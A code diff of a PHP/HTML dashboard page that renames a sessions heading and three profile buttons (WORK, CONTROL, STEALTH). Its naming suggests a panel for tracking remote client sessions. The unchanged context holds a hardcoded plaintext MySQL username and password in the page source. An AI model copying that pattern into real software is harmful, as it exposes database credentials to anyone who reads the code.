@@ -130,7 +130,7 @@
     		    </ul>
 	        </div>
                 <div class="tabs">
-    		    <p><font color="#ffffff"><b>SESSION TABS:</b></font></p><br>
+    		    <p><font color="#ffffff"><b>SESSIONS:</b></font></p><br>
     		    <?php
     			$pdo = new PDO('mysql:host=localhost;dbname=session', 'hunt3r', 'hunt3r');
     			$stmt = $pdo->query('SELECT sessionname, sessionstatus, xid FROM xsession');
@@ -156,11 +156,10 @@
 		</div>
 	        <div class="slider-container">
                     <form id="profileForm">
-	                <div class="timeinterval"><p><b>Time Interval:</b></p></div>
             	            <div class="profile-buttons">
-                                <button type="button" class="profile-button active" data-profile="Profil 1">Profile 1</button>
-                                <button type="button" class="profile-button" data-profile="Profil 2">Profile 2</button>
-                                <button type="button" class="profile-button" data-profile="Profil 3">Profile 3</button>
+                                <button type="button" class="profile-button active" data-profile="Profil 1">WORK</button>
+                                <button type="button" class="profile-button" data-profile="Profil 2">CONTROL</button>
+                                <button type="button" class="profile-button" data-profile="Profil 3">STEALTH</button>
                             </div>
                     	</form>
                     </div>
@@ -196,8 +195,6 @@
             <div class="timer">30</div>
     	</div>
     </div>
-
-
     <script type="text/javascript" src="/js/script.js" defer></script>
     <script type="text/javascript" src="/js/widgets.js" defer></script>
     <script type="text/javascript" src="/js/client_interval.js" defer></script>
